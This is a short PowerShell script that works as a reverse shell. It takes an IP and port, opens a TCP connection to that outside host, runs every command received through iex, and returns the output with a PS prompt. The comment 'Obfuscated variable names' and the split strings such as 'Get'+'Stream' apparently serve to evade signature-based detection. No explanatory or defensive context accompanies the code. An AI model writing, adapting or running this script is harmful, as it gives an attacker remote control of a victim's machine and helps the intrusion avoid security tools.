param (
    [string]$ip,
    [int]$port
)

# Obfuscated variable names
$A = 'Get'+'Stream'
$C = [System.Text.Encoding]::'ASCII'
$b = 0..65535 | % {0}
$Q = 'System.Net.Sockets.TCPClient'
$w = 'Re'+'ad'
$O = 'Wr'+'ite'
$F = 'System.Text.ASCIIEncoding'

$client = New-Object $Q($ip, $port)
$stream = $client.$A()
while (($i = $stream.$w($b, 0, $b.Length)) -ne 0) {
    $d = (New-Object -TypeName $F).GetString($b, 0, $i)
    $S = (iex $d 2>&1 | Out-String)
    $R = $S + "PS " + (pwd).Path + "> "
    $f = $C.GetBytes($R)
    $stream.$O($f, 0, $f.Length)
    $stream.Flush()
}
$client.Close()